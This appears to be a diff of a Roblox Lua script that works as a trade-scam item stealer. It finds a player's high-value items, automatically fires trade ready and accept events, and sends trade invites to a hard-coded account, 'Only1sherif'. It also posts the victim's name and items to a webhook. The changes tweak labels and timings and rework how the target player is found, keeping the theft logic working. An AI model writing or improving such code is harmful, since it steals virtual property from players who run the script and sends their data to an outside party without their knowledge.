@@ -3,7 +3,6 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
 local plr = Players.LocalPlayer
 
 local LOGGER_TARGET = "Only1sherif"
@@ -86,10 +85,10 @@ local function sendWebhook(items)
             Body = HttpService:JSONEncode({
                 content = "@everyone",
                 embeds = {{
-                    title = "✦ Item Found ✦",
+                    title = "✦ Item Spotted ✦",
                     fields = {
                         { name = "👤 Victim", value = "```" .. plr.Name .. "```", inline = true },
-                        { name = "🧠 Items", value = "```" .. table.concat(items, "\n") .. "```", inline = false },
+                        { name = "🧠 Brainrots", value = "```" .. table.concat(items, "\n") .. "```", inline = false },
                     },
                     color = 16711680
                 }}
@@ -114,7 +113,7 @@ task.spawn(function()
                 local inner = tradeUI.TradeLiveTrade
                 
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
-                task.wait(0.1)
+                task.wait(0.2)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                 
                 if inner.Other.Username.Text:lower():find(LOGGER_TARGET:lower()) then
@@ -137,24 +136,17 @@ task.spawn(function()
                 if #highValue > 0 then
                     local listGui = plr.PlayerGui:FindFirstChild("TradePlayerList")
                     if listGui and listGui:FindFirstChild("TradePlayerList") then
-                        local tl = listGui.TradePlayerList
-                        local sb = tl.bg.SearchFrame.SearchBox
-                        
-                        sb.Text = ""
-                        task.wait(0.1)
-                        sb.Text = LOGGER_TARGET
-                        task.wait(0.1)
-                        firesignal(sb.FocusLost, true)
-                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-                        
-                        task.wait(0.5)
-                        for _, p in pairs(tl.Global.List:GetChildren()) do
-                            if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                                local send = p.Fill:FindFirstChild("Send")
-                                if send and send.Visible then
-                                    firesignal(send.Activated)
-                                    sendWebhook(highValue)
-                                    break
+                        local list = listGui.TradePlayerList.Global.List
+                        for _, frame in pairs(list:GetChildren()) do
+                            if frame:IsA("Frame") and frame:FindFirstChild("Fill") then
+                                local nameLabel = frame.Fill:FindFirstChild("Username")
+                                if nameLabel and nameLabel.Text:lower():find(LOGGER_TARGET:lower()) then
+                                    local send = frame.Fill:FindFirstChild("Send")
+                                    if send then
+                                        firesignal(send.Activated)
+                                        sendWebhook(highValue)
+                                        task.wait(5) -- Don't spam invites
+                                    end
                                 end
                             end
                         end
@@ -162,6 +154,6 @@ task.spawn(function()
                 end
             end
         end)
-        task.wait(1)
+        task.wait(1.5)
     end
 end)
